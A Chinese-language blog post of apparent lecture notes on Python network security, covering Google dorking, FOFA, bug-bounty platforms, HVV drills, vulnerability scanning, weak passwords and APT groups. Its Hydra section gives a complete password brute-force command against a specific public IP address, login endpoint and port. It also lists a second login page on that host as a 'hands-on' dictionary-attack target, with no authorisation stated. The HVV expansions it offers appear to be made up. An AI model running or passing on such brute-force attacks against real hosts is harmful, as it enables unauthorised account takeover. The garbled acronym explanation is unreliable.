---
layout: post
title:  python网络安全 网络安全讲座
date:   2025-11-26 09:01:00 +0800
image: 09.jpg
tags: 
    - python
    - security
---

### google search : filetype:xls ic

"google hacking database"

site : 网址
intext : 关键字
intitle : 标题

### 网络空间绘测(暗黑搜寻引擎)

探测全球互联网节点

[fofa.info](fofa.info)

### SRC漏洞挖掘 

google seacrh : 漏洞盒子 | 补天

SRC 漏洞挖掘（挖掘平台漏洞）

SRC 是 Security Response Center 的缩写，即安全应急响应中心。这些平台由各大互联网公司（如腾讯、阿里、百度等）或特定组织建立，用于接收、处理并奖励外部安全研究人员（白帽黑客）提交的自家产品和系统漏洞。

SRC 漏洞挖掘本质上是**渗透测试或漏洞赏金（Bug Bounty）**的一种形式，专注于为企业发现并提交其自身的安全缺陷。

### HVV 护网

“HVV 护网”是中国网络安全行业的一个特定术语和大规模行动，它本身并不是指一个组织，而是指一项年度性的、由政府主导的网络安全演习和实战对抗活动。

HVV 是 Hunting Victims and Vulnerability 的缩写（或通俗解释为 Hacking Virus Virus），中文常被称为**“护网行动”或“网络攻防演练”**

### 漏洞探测

漏洞探测 (Vulnerability Scanning/Detection)

漏洞探测是网络安全中的一个关键步骤,通常发生在信息收集阶段之后、渗透测试或攻击阶段之前。它的目标是识别目标系统、网络、应用或设备中存在的安全弱点。

漏洞探测（或扫描）是使用自动化工具或手动方法,系统性地检查资产(如服务器、Web 应用、操作系统、网络设备等)是否存在已知的配置错误、软件缺陷、服务弱点或其他安全缺陷的过程。

### 弱空令

容易被他人猜测或者被破解工具快速攻破的密码

"字典"

实作:用python用readlines进行字典攻击

"password" > attack
"password" > attack
"password" > attack

多个文件内容

### Hydra 九头蛇

安全框架 > 自动化

hydra 模拟broswer登录一个网站的行为

```bash
hydra -l admin -P 常用密码.txt 39.104.24.217 http-post-form "/tydc/api/Weigh/Login:username=^USER&password=^PASS:F=Invalid Credentials" -s 8030 -V
```

实作:目标网址进行字典攻击hydra
```
39.104.24.217:8002/CompanyLogin.html
```

针对性的密码收集 : 社交工程 (社会工程学)

### APT组织

Advanced Perisistent Threat 高级持续性威胁

具政府背景且高危的组织?

根据chatgpt的解释:

> 指一种由具备高水平技术的、有组织的支持实体发起的、针对特定目标进行长期且隐蔽性极强的网络攻击行为。

[ti.dbappsecurity.com.cn/apt/list](ti.dbappsecurity.com.cn/apt/list)

[apt.360.net](apt.360.net)


